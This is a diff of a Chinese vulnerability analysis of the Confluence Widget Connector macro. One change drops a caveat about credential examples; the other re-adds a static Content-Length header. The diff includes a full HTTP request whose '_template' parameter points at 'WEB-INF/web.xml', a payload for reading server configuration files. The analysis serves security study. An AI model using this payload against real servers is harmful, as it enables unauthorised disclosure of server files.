@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -153,13 +153,14 @@ User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Tride
 Connection: close
 Content-Type: application/json
 Referer: http://www.riskivy.xyz:8091/
+Content-Length: 169
 
 {"contentId":"0","macro":{"name":"widget","body":"","params":{"url":"http://localhost/www.dailymotion.com/","width":"300","height":"200","\_template":"WEB-INF/web.xml"\}\\}\}
 
 
 ```
 
-> 请求长度说明：原资料 Content-Length 为 169；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 169；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![](https://blog.riskivy.com/wp-content/uploads/2019/04/4cbc845ee78798423248697ae7b80ce6.png)  
 注意到 params 的 template 参数由用户输入，跟进 velocityRenderService 的 render，  
